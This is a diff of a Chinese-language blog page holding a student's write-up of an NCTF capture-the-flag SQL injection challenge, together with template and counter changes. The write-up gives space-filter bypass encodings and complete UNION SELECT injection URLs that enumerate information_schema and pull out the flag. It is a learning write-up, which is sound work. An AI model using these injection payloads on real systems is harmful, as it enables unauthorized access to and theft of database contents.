@@ -163,7 +163,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">诗酒趁年华</p>
+        <h1 class="site-subtitle" itemprop="description">诗酒趁年华</h1>
       
   </div>
 
@@ -314,7 +314,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">nctf打卡题</h1>
+          <h2 class="post-title" itemprop="name headline">nctf打卡题</h2>
         
 
         <div class="post-meta">
@@ -441,7 +441,7 @@
       
 
       
-        <p>我果真是太菜了，nctf只做出了web签到题和re签到题外加打了一个i wanna，连web的sql注入签到都没有做出来，在看了一位大佬的write up后，感觉收获很多。<br><a href="http://ctfgame.acdxvfsvd.net:20001/" target="_blank" rel="noopener">http://ctfgame.acdxvfsvd.net:20001/</a><br>首先学到了空格的过滤绕过：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="number">20</span> <span class="meta">%</span><span class="number">09</span> <span class="meta">%</span><span class="number">0</span>a <span class="meta">%</span><span class="number">0</span>b <span class="meta">%</span><span class="number">0</span>c <span class="meta">%</span><span class="number">0</span>d <span class="meta">%</span>a<span class="number">0</span> <span class="meta">%</span><span class="number">00</span> <span class="comment">/**/</span>    <span class="comment">()</span></span><br></pre></td></tr></table></figure></p>
+        <p>我果真是太菜了，nctf只做出了web签到题和re签到题外加打了一个i wanna，连web的sql注入签到都没有做出来，在看了一位大佬的write up后，感觉收获很多。<br><a href="http://ctfgame.acdxvfsvd.net:20001/" target="_blank" rel="noopener">http://ctfgame.acdxvfsvd.net:20001/</a><br>首先学到了空格的过滤绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/    ()</span><br></pre></td></tr></table></figure></p>
 <p>发现过滤了截断符号%23,#,–+，只要在语句最后在加个单引号使其闭合就可以了，’’空的也可以执行，就不用用注释了。<br>然后大佬提到’必须直接跟在select后。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1''    查询:<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'''</span> LIMIT0,<span class="number">1</span>     可以</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and 1=1'</span> 查询:<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>   不可以</span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">'  union select 1,2,3'</span>   可以</span><br></pre></td></tr></table></figure></p>
 <p>然后用子查询进行操作,select * from user where id=’-1’ union select (select group_concat(schema_name) from information_schema.schemata),2,3’，这样就行了。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(<span class="keyword">select</span>%a0group_concat(schema_name)%a0from%a0information_schema.schemata),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>爆数据库名，应该是这个flaaaaaaag数据库。</span><br><span class="line"><span class="keyword">http</span>://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?<span class="keyword">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0union%a0select%a0(<span class="keyword">select</span>%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=%<span class="number">27</span>flaaaaaaag%<span class="number">27</span>),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>爆表名，f144444444g</span><br><span class="line"><span class="keyword">http</span>://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?<span class="keyword">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0union%a0select%a0(<span class="keyword">select</span>%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=%<span class="number">27</span>f144444444g%<span class="number">27</span>),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>爆列名，th1s_1s_flag</span><br><span class="line"><span class="keyword">http</span>://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?<span class="keyword">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0union%a0select%a0(<span class="keyword">select</span>%a0th1s_1s_flag%a0from%a0flaaaaaaag.f144444444g),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>查询到flag</span><br></pre></td></tr></table></figure></p>
 <p>收获很多。</p>
@@ -592,7 +592,7 @@
               <img class="site-author-image" itemprop="image" src="http://i2.bvimg.com/665720/a3df83bbe2d864de.jpg" alt="晨曦远">
             
               <p class="site-author-name" itemprop="name">晨曦远</p>
-              <p class="site-description motion-element" itemprop="description">一只大一单身狗</p>
+              <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
           <nav class="site-state motion-element">
@@ -602,7 +602,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">21</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -747,7 +747,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">10.9k</span>
+    <span title="Site words total count">11.1k</span>
   
 </div>
 
